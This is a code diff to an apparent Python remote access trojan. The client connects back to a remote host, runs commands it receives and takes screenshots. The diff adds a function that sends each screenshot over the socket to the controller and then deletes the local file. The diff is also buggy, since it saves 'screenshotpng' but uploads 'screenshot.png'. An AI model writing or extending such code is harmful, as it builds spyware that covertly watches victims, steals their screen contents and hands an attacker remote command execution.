@@ -3,15 +3,19 @@
 # import modules
 import socket
 import subprocess
+import os
 from PIL import ImageGrab
 
 
 def screenshot():
-    count = 0
     shot = ImageGrab.grab()
-    shot.save(f'screenshot{count}.png')
+    shot.save(f'screenshotpng')
     shot.close()
-    count += 1
+
+
+def upload(file):
+    f = open(file, 'rb')
+    client.send(f.read())
 
 
 # define remote host and port
@@ -31,6 +35,8 @@ while True:
         pass
     elif comm == 'screenshot':
         screenshot()
+        upload('screenshot.png')
+        os.remove('screenshot.png')
     else:
         try:
             # excute command sending the output
